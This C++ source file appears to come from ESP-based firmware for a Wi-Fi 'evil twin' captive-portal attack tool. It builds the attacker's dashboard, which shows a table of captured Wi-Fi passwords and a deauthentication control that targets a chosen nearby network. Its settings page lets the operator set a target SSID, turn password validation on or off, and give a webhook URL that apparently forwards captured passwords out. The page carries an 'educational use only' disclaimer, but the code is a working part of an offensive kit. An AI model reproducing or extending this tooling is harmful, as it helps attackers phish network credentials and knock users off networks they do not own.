#include "dashboard.h"

String encryptMode(const int eC){
  if(eC == 4){ return "WPA2"; }
  if(eC == 2){ return "WPA"; }
  if(eC == 5){ return "WEP"; }
  if(eC == 7){ return "None"; }
  return "????";
}

String signalColor(const int strength){
  if(strength <= -80){ return "red"; }
  if(strength <= -70){ return "yellow"; }
  return "green";
}

String indexDashboard(const String& favicon, const String& CSS, const String& allPass, const int numNetworks, const bool deauthing){
  String _html = "<!DOCTYPE html>"
  "<html>"
    "<head>"
      "<link rel='icon' type='image/x-png' href='data:image/png;base64," + favicon +
      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
      "<title> Captive Portal Dashboard</title>"
      "<style>" + CSS + "</style>"
    "</head>"
    "<body>"
      "<div class='content'>"
        "<div>"
          "<div class='button-container'>"
            "<h1 style='padding: 3px 0.1em; text-align: center; font-size: 40px; margin-top: 10px;'>Captive Portal Dashboard</h1>"

            "<nav>"
              "<ul id='pages'>"
                "<li><a href='dashboard'>attack</a></li>"
                "<li><a href='settings'>settings</a></li>"
              "</ul>"
            "</nav>"
          "</div>"

          "<div>"
            "<p style='color: red;'>INFO:</p>"
            "<ul style='padding-left: 2.366vw;'>"
              "<li style='color: red;'>! ! ! ONLY FOR EDUCATIONAL USE, USING ITON DEVICES OR NETWORKS YOU DO HAVE PERMISSION TO IS ILLEGAL AND WILL GET YOU INTROUBLE ! ! !</li>"
              "<li>Credits to: Spacehuhn, adamff-dev,sankethj and justcallmekoko. Their projects helped me understand things, and without the knowledge I gained from their projecthis would   probably   not   work</li>"
              "<li>To disable the webhook, submit a blank field</li>"
              "<li>You are Currently using version: 3.0</li>"
              "<li>Made by HEINZGUENTER</li>"
            "</ul>"
          "</div>"
        "</div>"
        "<div>"
          "<div class='button-container'>"
            "<h1 style='padding-right: 112px;'>Captured Passwords</h1>"
            "<form style='display:inline-block;' method='post' action='/clearPass'>"
              "<button style='display:inline-block;'>Delete Passwords</button>"
            "</form>"
            "<form style='display:inline-block;' method='post' action='/dashboard?led_off'>"
              "<button style='display:inline-block;'>Disable LED</button>"
            "</form>"
          "</div>";

          //adds passwords to the table if one or more was entered
          if (allPass != "") {
            _html+= "<table style='text-align: center;'><tbody><tr><th>Password</th><th>Seconds after Bootup</th></tr><tr><td>";

            //"decodes" allpass string and add it to the table
            for (int i = 0; i < allPass.length(); i++){
              if (allPass[i] != '\n' && allPass[i] != '\t'){ _html += allPass[i]; } //if the char is not a special symbol that needs to be replaced add it to the field
              else if (allPass[i] == '\t'){ _html += "</td><td>"; } //if char is a TAB char replace it with the html code for a new table cell
              else if (allPass[i] == '\n'){ 
                _html += "</td></tr>"; //add html code to close the cell
                if (i + 1 - allPass.length() != 0){ _html += "<tr><td>"; } //if this is not the last char in the allpass string start a new cell
              }
            }

          } else { _html += "<p><b style='margin: 7px 0px 7px 18px;'>No Passwords Captured yet!</b></p>"; }
          _html += "</tbody></table>"
        "</div>"
        "<div>"
          //Deauther part on the website
          "<h1>Deauther</h1>"
            "<div class='button-container'>"
              "<h2>Target:</h2>";

              if(deauthing == false){
                _html += "<form action='/deauth' methode='post'>"
                            "<select name='target' required>"
                              "<option value='' disabled selected>Choose</option>";

                              for (int i = 0; i < numNetworks; i++) { //adds an selection entry for every network
                                _html += "<option value='"; _html += i; _html += "'>" + WiFi.SSID(i) + "</option>";
                              }
    
                            _html += "</select>";
              } else { _html += "<form action='/stop' methode='post'>"; }
    
              _html += "<input type='submit' value='Deauth'>"
                      "</form>"
            "</div>"
        "</div>"
        "<div>"

          //nearby networks part
          "<div class='button-container'>"
            "<h1 style='padding-right: 300px;'>Nearby Networks</h1>"
            "<form style='display:inline-block;' method='post' action='/dashboard'>"
              "<button style='display:inline-block;'>Scan</button>"
            "</form>"
          "</div>"

          "<table>"
            "<tbody>"
              "<tr><th>SSID</th><th>Mac Adress</th><th>Channel</th><th>Signal Strength</th><th>Encryption</th></tr>";

              for (int i = 0; i < numNetworks; i++) { //adds a table entry for every network
                _html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" + WiFi.channel(i) + "</td><td style='color: " + signalColor(WiFi.RSSI(i)) + ";'>" + WiFi.RSSI(i)     +    "</    td><td>" + encryptMode(WiFi.encryptionType(i)) + "</td></tr>";
              }

          _html += ""
            "</tbody>"
          "</table>"
        "</div>"
      "</div>"
    "</body>"
  "</html>";

  return _html;
}

String settingsDashboard(const String& indexLang, const String& favicon, const String& CSS, const String& currentSSID, const bool validation, const String& webhookurl){
  String _html = "<!DOCTYPE html>"
  "<html>"
    "<head>"
      "<link rel='icon' type='image/x-png' href='data:image/png;base64," + favicon +
      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
      "<title> Captive Portal Dashboard</title>"
      "<style>" + CSS + "</style>"
    "</head>"
    "<body>"
      "<div class='content'>"
          "<div class='button-container'>"
            "<h1 style='padding: 3px 0.1em; text-align: center; font-size: 40px; margin-top: 10px;'>Captive Portal Dashboard</h1>"

            "<nav>"
              "<ul id='pages'>"
                "<li><a href='dashboard'>attack</a></li>"
                "<li><a href='settings'>settings</a></li>"
              "</ul>"
            "</nav>"
          "</div>"

          "<div class='button-container'>"
            "<h1>Settings</h1>"
            "<form style='display:inline-block;' method='post' action='/defaults'>"
              "<button style='display:inline-block;'>Restore Default Settings</button>"
            "</form>"
          "</div>"

          "<div class='button-container'>"
            "<h2>Language:</h2>"
            "<form action='/language' methode='post'><select name='lang'>";

            if (indexLang == "EN"){ _html += "<option value='DE'>DE</option><option selected value='EN'>EN</option>"; } 
            else { _html += "<option selected value='DE'>DE</option><option value='EN'>EN</option>"; }

            _html += "</select><input type=submit value='Change'></form>"
          "</div>"
          "<hr class='spacer'>"

          "<div class='button-container'>"
              "<h2>Password validation:</h2>"
              "<form action='/validate' methode='post'><select name='validate'>";

                //check and display if validation is turned on
                if (validation == true){ _html += "<option selected value='on'>On</option><option value='off'>Off</option>"; } 
                else { _html += "<option value='on'>On</option><option selected value='off'>Off</option>"; }

                _html += "</select><input type='submit' value='Enter'>"
              "</form>"
          "</div>"
          "<hr class='spacer'>"

          //SSID part on the website  
          "<div class='button-container'><h2>TargetSSID:</h2>"
            "<form action='/ssid'><input value='"+ currentSSID +"' type=text placeholder='Target SSID' name=ssid required maxlength='32'><input type=submit value='Change SSID'></form>"
          "</div>"
          "<hr class='spacer'>"

          "<div class='button-container'>"
            "<h2>WebHook:</h2>"
            "<form action='/webhook'>"
              "<input value='"+ webhookurl +"' type=text placeholder='WebHook Url' name=url>"
              "<input type=submit value='Change Url'>"
            "</form>"
          "</div>"

      "</div>"
    "</body>"
  "</html>";

  return _html;
}
